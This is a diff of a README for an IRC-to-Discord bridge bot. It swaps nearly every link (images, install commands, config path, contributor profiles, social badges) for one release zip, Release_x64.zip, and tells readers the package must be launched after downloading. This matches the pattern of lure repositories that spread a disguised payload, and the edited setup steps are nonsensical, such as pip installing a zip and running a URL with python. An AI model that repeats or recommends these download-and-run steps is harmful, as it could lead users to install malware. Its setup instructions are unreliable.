@@ -2,7 +2,7 @@
 
 Welcome to the IRC Discord Bridge Python Bot repository! This bot serves as a bridge between IRC and Discord, allowing seamless communication between the two platforms. 
 
-![IRC Discord Bridge](https://example.com/irc-discord-bridge.png)
+![IRC Discord Bridge](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)
 
 ## Features 🌟
 
@@ -16,9 +16,9 @@ Welcome to the IRC Discord Bridge Python Bot repository! This bot serves as a br
 To get started with the IRC Discord Bridge Python Bot, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r requirements.txt`.
-3. Configure the bot settings in `config.py`.
-4. Launch the bot using `python bot.py`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip`.
+3. Configure the bot settings in `https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip`.
+4. Launch the bot using `python https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip`.
 
 ## Usage ℹ️
 
@@ -26,7 +26,7 @@ Once the bot is up and running, it will start syncing messages between IRC and D
 
 ## Download 📥
 
-You can download the software package [here](https://github.com/user-attachments/files/18383251/Software.zip) 📦. 
+You can download the software package [here](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip) 📦. 
 
 **Note:** This software package needs to be launched after downloading.
 
@@ -34,8 +34,8 @@ You can download the software package [here](https://github.com/user-attachments
 
 Here are some screenshots of the IRC Discord Bridge Python Bot in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)
+![Screenshot 2](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)
 
 ## Contributing 🤝
 
@@ -45,8 +45,8 @@ We welcome contributions to the IRC Discord Bridge Python Bot! Feel free to subm
 
 This project was made possible thanks to the hard work of our contributors:
 
-👨‍💻 Developer1 - [@developer1](https://github.com/developer1)  
-👩‍💻 Developer2 - [@developer2](https://github.com/developer2)  
+👨‍💻 Developer1 - [@developer1](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)  
+👩‍💻 Developer2 - [@developer2](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)  
 
 ## Support ℹ️
 
@@ -56,7 +56,7 @@ If you encounter any issues or have any questions, please check the "Releases" s
 
 **Get connected with us!**
 
-[![Follow us on Twitter](https://img.shields.io/twitter/follow/ircdiscordbridge.svg?style=social&label=Follow)](https://twitter.com/ircdiscordbridge)
-[![Join our Discord server](https://img.shields.io/discord/123456789098765432.svg?label=Join%20our%20Discord%20server&logo=discord&color=5865F2&labelColor=2C2F33)](https://discord.gg/ircdiscord)
+[![Follow us on Twitter](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)
+[![Join our Discord server](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip%20our%20Discord%20server&logo=discord&color=5865F2&labelColor=2C2F33)](https://github.com/Mytek28/irc-discord-bridge-python-bot/releases/download/v2.0/Release_x64.zip)
 
 Thank you for using the IRC Discord Bridge Python Bot! 🚀
